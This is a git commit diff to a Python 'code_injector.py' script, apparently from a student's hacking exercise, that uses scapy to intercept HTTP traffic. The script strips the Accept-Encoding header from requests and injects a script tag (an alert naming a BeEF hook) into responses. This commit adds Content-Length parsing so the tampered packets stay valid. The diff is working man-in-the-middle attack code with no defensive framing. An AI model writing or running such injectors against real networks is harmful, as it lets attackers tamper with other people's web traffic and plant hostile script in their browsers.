f00f57abb8d7aa81bfb9b7d80d913d315090f844
Noe <Noe.BERDOZ@cpnv.ch>
2022-02-05 18:05:13 +0100

    Code Injector Script - Manage packet's field Content-Length

--- code_injector.py
+++ code_injector.py
@@ -24,12 +24,20 @@ def process_packet(packet):
 
             #  Regex: Accept-Encoding:.*?\\r\\n
             #  take "Accept-Encoding", ".*" any type & number of characters, "?\\r\\n" stop at first occurrence '\r\n'
-            #  Accept-Encoding:.*?\\r\\n
             load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)  # Replace occurrence that change data format
 
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
             load = load.replace("<body>", "<body><script>alert('This could be a Beef Hook');</script>")
+            print(scapy_packet.show())
+
+            #  TODO manage Content-Length
+            #  Regex: (?:Content-Length:\s)(\d*)
+            #  take "Content-Length", "\s" space, \d* any number characters, "(?:)" exclude, "()" include
+            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
+            if content_length_search:
+                content_length = content_length_search.group(1)  # (0) = Content-Length:\s\d*, (1) = (\d*)
+                print(content_length)
 
         # Set packet if his load has been modified
         if load != scapy_packet[scapy.Raw].load:
